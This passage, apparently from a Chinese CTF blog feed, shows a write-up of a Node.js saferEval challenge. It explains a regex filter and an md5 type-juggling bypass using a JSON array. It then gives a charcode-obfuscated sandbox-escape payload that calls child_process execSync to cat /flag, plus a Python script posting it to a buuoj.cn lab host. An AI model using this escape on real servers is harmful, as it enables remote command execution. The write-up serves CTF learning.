&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;Object&lt;/span&gt;.freeze(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;Math&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;app.post(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;/&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;function&lt;/span&gt; (req, res) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;let&lt;/span&gt; result &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#ff79c6&#34;&gt;const&lt;/span&gt; results &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; req.session.results &lt;span style=&#34;color:#ff79c6&#34;&gt;||&lt;/span&gt; [];
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#ff79c6&#34;&gt;const&lt;/span&gt; { e, first, second } &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; req.body;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#ff79c6&#34;&gt;if&lt;/span&gt; (first &lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; second &lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; first.length &lt;span style=&#34;color:#ff79c6&#34;&gt;===&lt;/span&gt; second.length &lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; first&lt;span style=&#34;color:#ff79c6&#34;&gt;!==&lt;/span&gt;second &lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; md5(first&lt;span style=&#34;color:#ff79c6&#34;&gt;+&lt;/span&gt;keys[&lt;span style=&#34;color:#bd93f9&#34;&gt;0&lt;/span&gt;]) &lt;span style=&#34;color:#ff79c6&#34;&gt;===&lt;/span&gt; md5(second&lt;span style=&#34;color:#ff79c6&#34;&gt;+&lt;/span&gt;keys[&lt;span style=&#34;color:#bd93f9&#34;&gt;0&lt;/span&gt;])) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ff79c6&#34;&gt;if&lt;/span&gt; (req.body.e) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#ff79c6&#34;&gt;try&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        result &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; saferEval(req.body.e) &lt;span style=&#34;color:#ff79c6&#34;&gt;||&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;Wrong Wrong Wrong!!!&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      } &lt;span style=&#34;color:#ff79c6&#34;&gt;catch&lt;/span&gt; (e) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        console.log(e);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        result &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;Wrong Wrong Wrong!!!&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      results.unshift(&lt;span style=&#34;color:#f1fa8c&#34;&gt;`&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;${&lt;/span&gt;req.body.e&lt;span style=&#34;color:#f1fa8c&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;${&lt;/span&gt;result&lt;span style=&#34;color:#f1fa8c&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;`&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  } &lt;span style=&#34;color:#ff79c6&#34;&gt;else&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    results.unshift(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;Not verified!&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#ff79c6&#34;&gt;if&lt;/span&gt; (results.length &lt;span style=&#34;color:#ff79c6&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#bd93f9&#34;&gt;13&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    results.pop();
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  req.session.results &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; results;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  res.send(render(req.session.results));
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;});
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6272a4&#34;&gt;// 2019.10/WORKER1 老板娘说她要看到我们的源代码，用行数计算KPI
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6272a4&#34;&gt;&lt;/span&gt;app.get(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;/source&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;function&lt;/span&gt; (req, res) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  res.set(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;Content-Type&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;text/javascript;charset=utf-8&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  res.send(fs.readFileSync(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;./index.js&amp;#39;&lt;/span&gt;));
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;});
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;app.get(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;/&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;function&lt;/span&gt; (req, res) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  res.set(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;Content-Type&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;text/html;charset=utf-8&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  req.session.admin &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; req.session.admin &lt;span style=&#34;color:#ff79c6&#34;&gt;||&lt;/span&gt; &lt;span style=&#34;color:#bd93f9&#34;&gt;0&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  res.send(render(req.session.results &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; req.session.results &lt;span style=&#34;color:#ff79c6&#34;&gt;||&lt;/span&gt; []))
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;});
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;app.listen(&lt;span style=&#34;color:#bd93f9&#34;&gt;80&lt;/span&gt;, &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;0.0.0.0&amp;#39;&lt;/span&gt;, () =&amp;gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  console.log(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;Start listening&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;});
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;看了一遍，盯紧两个地方，一个是超大正则，一个是判断md5&lt;/p&gt;
&lt;p&gt;第一个，正则可视化&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://regexper.com/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://regexper.com/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://wangwl.net/r/vr&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://wangwl.net/r/vr&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://pic.imgdb.cn/item/6240226327f86abb2a968f64.png&#34; &gt;
		&lt;img src=&#34;https://pic.imgdb.cn/item/6240226327f86abb2a968f64.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;允许&lt;code&gt;()+\-*/&amp;amp;|^%&amp;lt;&amp;gt;=,?:&lt;/code&gt;，允许Math.xxxx这样子的任意形式函数调用，以及浮点数科学计数法的数字表示形式，还有空格&lt;/p&gt;
&lt;p&gt;知识：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;(?:)&lt;/code&gt;就是为了分组，但是不捕获下来供正则表达式其他部分使用，叫非获取匹配&lt;/p&gt;
&lt;p&gt;emmm，就是简简单单分个组：pattern4和pattern5作用一样&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;var&lt;/span&gt; pattern1&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;/aacdaa/&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;var&lt;/span&gt; pattern2&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;/(?:aa|bb)cd\1/&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;var&lt;/span&gt; pattern3&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;/(aa|bb)cd\1/&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;var&lt;/span&gt; pattern4&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;/aacd|bbcd/&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;var&lt;/span&gt; pattern5&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;/(?:aa|bb)cd/&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;var&lt;/span&gt; str&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;aacdaa&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;console.log(str.match(pattern1)); &lt;span style=&#34;color:#6272a4&#34;&gt;// [&amp;#34;aacdaa&amp;#34;, index: 0, input: &amp;#34;aacdaa&amp;#34;]
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6272a4&#34;&gt;&lt;/span&gt;console.log(str.match(pattern2)); &lt;span style=&#34;color:#6272a4&#34;&gt;// null
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6272a4&#34;&gt;&lt;/span&gt;console.log(str.match(pattern3)); &lt;span style=&#34;color:#6272a4&#34;&gt;// [&amp;#34;aacdaa&amp;#34;, &amp;#34;aa&amp;#34;, index: 0, input: &amp;#34;aacdaa&amp;#34;]
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;/g 全局匹配，咱不管&lt;/p&gt;
&lt;p&gt;第二个&lt;/p&gt;
&lt;p&gt;&lt;code&gt;first &amp;amp;&amp;amp; second &amp;amp;&amp;amp; first.length === second.length &amp;amp;&amp;amp; first!==second &amp;amp;&amp;amp; md5(first+keys[0]) === md5(second+keys[0])&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;长度相同，互不相等，加key[0]之后md5相等&lt;/p&gt;
&lt;p&gt;弱类型，加盐之后都是字符串&lt;/p&gt;
&lt;p&gt;让first 是字符1，second 是数组1，但urlencode没法接收数组&lt;/p&gt;
&lt;p&gt;正好这里可以传json，也就可以用json解决&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://pic.imgdb.cn/item/6240227227f86abb2a96efb0.png&#34; &gt;
		&lt;img src=&#34;https://pic.imgdb.cn/item/6240227227f86abb2a96efb0.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;记得加上Content-Type&amp;quot;: &amp;ldquo;application/json&lt;/p&gt;
&lt;p&gt;绕过正则看不下去了，直接贴结果&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;Math&lt;/span&gt;=&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        (&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;Math&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;Math&lt;/span&gt;.constructor,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;Math&lt;/span&gt;.x&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;Math&lt;/span&gt;.constructor(
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                    &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;Math&lt;/span&gt;.fromCharCode(&lt;span style=&#34;color:#bd93f9&#34;&gt;114&lt;/span&gt;,&lt;span style=&#34;color:#bd93f9&#34;&gt;101&lt;/span&gt;,&lt;span style=&#34;color:#bd93f9&#34;&gt;116&lt;/span&gt;,&lt;span style=&#34;color:#bd93f9&#34;&gt;117&lt;/span&gt;,&lt;span style=&#34;color:#bd93f9&#34;&gt;114&lt;/span&gt;,&lt;span style=&#34;color:#bd93f9&#34;&gt;110&lt;/span&gt;,&lt;span style=&#34;color:#bd93f9&#34;&gt;32&lt;/span&gt;,&lt;span style=&#34;color:#bd93f9&#34;&gt;112&lt;/span&gt;,&lt;span style=&#34;color:#bd93f9&#34;&gt;114&lt;/span&gt;,&lt;span style=&#34;color:#bd93f9&#34;&gt;111&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                        &lt;span style=&#34;color:#bd93f9&#34;&gt;99&lt;/span&gt;,&lt;span style=&#34;color:#bd93f9&#34;&gt;101&lt;/span&gt;,&lt;span style=&#34;color:#bd93f9&#34;&gt;115&lt;/span&gt;,&lt;span style=&#34;color:#bd93f9&#34;&gt;115&lt;/span&gt;,&lt;span style=&#34;color:#bd93f9&#34;&gt;46&lt;/span&gt;,&lt;span style=&#34;color:#bd93f9&#34;&gt;109&lt;/span&gt;,&lt;span style=&#34;color:#bd93f9&#34;&gt;97&lt;/span&gt;,&lt;span style=&#34;color:#bd93f9&#34;&gt;105&lt;/span&gt;,&lt;span style=&#34;color:#bd93f9&#34;&gt;110&lt;/span&gt;,&lt;span style=&#34;color:#bd93f9&#34;&gt;77&lt;/span&gt;,&lt;span style=&#34;color:#bd93f9&#34;&gt;111&lt;/span&gt;,&lt;span style=&#34;color:#bd93f9&#34;&gt;100&lt;/span&gt;,&lt;span style=&#34;color:#bd93f9&#34;&gt;117&lt;/span&gt;,&lt;span style=&#34;color:#bd93f9&#34;&gt;108&lt;/span&gt;,&lt;span style=&#34;color:#bd93f9&#34;&gt;101&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                        &lt;span style=&#34;color:#bd93f9&#34;&gt;46&lt;/span&gt;,&lt;span style=&#34;color:#bd93f9&#34;&gt;114&lt;/span&gt;,&lt;span style=&#34;color:#bd93f9&#34;&gt;101&lt;/span&gt;,&lt;span style=&#34;color:#bd93f9&#34;&gt;113&lt;/span&gt;,&lt;span style=&#34;color:#bd93f9&#34;&gt;117&lt;/span&gt;,&lt;span style=&#34;color:#bd93f9&#34;&gt;105&lt;/span&gt;,&lt;span style=&#34;color:#bd93f9&#34;&gt;114&lt;/span&gt;,&lt;span style=&#34;color:#bd93f9&#34;&gt;101&lt;/span&gt;,&lt;span style=&#34;color:#bd93f9&#34;&gt;40&lt;/span&gt;,&lt;span style=&#34;color:#bd93f9&#34;&gt;39&lt;/span&gt;,&lt;span style=&#34;color:#bd93f9&#34;&gt;99&lt;/span&gt;,&lt;span style=&#34;color:#bd93f9&#34;&gt;104&lt;/span&gt;,&lt;span style=&#34;color:#bd93f9&#34;&gt;105&lt;/span&gt;,&lt;span style=&#34;color:#bd93f9&#34;&gt;108&lt;/span&gt;,&lt;span style=&#34;color:#bd93f9&#34;&gt;100&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                        &lt;span style=&#34;color:#bd93f9&#34;&gt;95&lt;/span&gt;,&lt;span style=&#34;color:#bd93f9&#34;&gt;112&lt;/span&gt;,&lt;span style=&#34;color:#bd93f9&#34;&gt;114&lt;/span&gt;,&lt;span style=&#34;color:#bd93f9&#34;&gt;111&lt;/span&gt;,&lt;span style=&#34;color:#bd93f9&#34;&gt;99&lt;/span&gt;,&lt;span style=&#34;color:#bd93f9&#34;&gt;101&lt;/span&gt;,&lt;span style=&#34;color:#bd93f9&#34;&gt;115&lt;/span&gt;,&lt;span style=&#34;color:#bd93f9&#34;&gt;115&lt;/span&gt;,&lt;span style=&#34;color:#bd93f9&#34;&gt;39&lt;/span&gt;,&lt;span style=&#34;color:#bd93f9&#34;&gt;41&lt;/span&gt;,&lt;span style=&#34;color:#bd93f9&#34;&gt;46&lt;/span&gt;,&lt;span style=&#34;color:#bd93f9&#34;&gt;101&lt;/span&gt;,&lt;span style=&#34;color:#bd93f9&#34;&gt;120&lt;/span&gt;,&lt;span style=&#34;color:#bd93f9&#34;&gt;101&lt;/span&gt;,&lt;span style=&#34;color:#bd93f9&#34;&gt;99&lt;/span&gt;,&lt;span style=&#34;color:#bd93f9&#34;&gt;83&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                        &lt;span style=&#34;color:#bd93f9&#34;&gt;121&lt;/span&gt;,&lt;span style=&#34;color:#bd93f9&#34;&gt;110&lt;/span&gt;,&lt;span style=&#34;color:#bd93f9&#34;&gt;99&lt;/span&gt;,&lt;span style=&#34;color:#bd93f9&#34;&gt;40&lt;/span&gt;,&lt;span style=&#34;color:#bd93f9&#34;&gt;39&lt;/span&gt;,&lt;span style=&#34;color:#bd93f9&#34;&gt;99&lt;/span&gt;,&lt;span style=&#34;color:#bd93f9&#34;&gt;97&lt;/span&gt;,&lt;span style=&#34;color:#bd93f9&#34;&gt;116&lt;/span&gt;,&lt;span style=&#34;color:#bd93f9&#34;&gt;32&lt;/span&gt;,&lt;span style=&#34;color:#bd93f9&#34;&gt;47&lt;/span&gt;,&lt;span style=&#34;color:#bd93f9&#34;&gt;102&lt;/span&gt;,&lt;span style=&#34;color:#bd93f9&#34;&gt;108&lt;/span&gt;,&lt;span style=&#34;color:#bd93f9&#34;&gt;97&lt;/span&gt;,&lt;span style=&#34;color:#bd93f9&#34;&gt;103&lt;/span&gt;,&lt;span style=&#34;color:#bd93f9&#34;&gt;39&lt;/span&gt;,&lt;span style=&#34;color:#bd93f9&#34;&gt;41&lt;/span&gt;))()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        )
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;)(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;Math&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#bd93f9&#34;&gt;1&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;import&lt;/span&gt; requests
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;import&lt;/span&gt; json
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;headers &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;Content-Type&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;application/json&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;url &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;http://d609db3d-6a1a-4835-9b9e-623822d89eb1.node4.buuoj.cn:81/&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;data &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; {&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;e&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;(Math=&amp;gt;(Math=Math.constructor,Math.x=Math.constructor(Math.fromCharCode(114,101,116,117,114,110,32,112,114,111,99,101,115,115,46,109,97,105,110,77,111,100,117,108,101,46,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,101,120,101,99,83,121,110,99,40,39,99,97,116,32,47,102,108,97,103,39,41))()))(Math+1)&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;first&amp;#34;&lt;/span&gt;: [&lt;span style=&#34;color:#bd93f9&#34;&gt;0&lt;/span&gt;], &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;second&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;0&amp;#34;&lt;/span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;r &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; requests&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;post(url, data&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;json&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;dumps(data), headers&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;headers)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;print&lt;/span&gt;(r&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;text)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;学js去了&lt;/p&gt;
</description>
        </item>
        <item>
        <title>[安洵杯2019]cssgame</title>
        <link>https://proben1.github.io/2021/%E5%AE%89%E6%B4%B5%E6%9D%AF2019cssgame/</link>
        <pubDate>Mon, 22 Nov 2021 16:37:25 +0800</pubDate>
        
        <guid>https://proben1.github.io/2021/%E5%AE%89%E6%B4%B5%E6%9D%AF2019cssgame/</guid>
        <description>&lt;h2 id=&#34;安洵杯-2019cssgame&#34;&gt;[安洵杯 2019]cssgame&lt;/h2&gt;
&lt;p&gt;露骨的F12&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
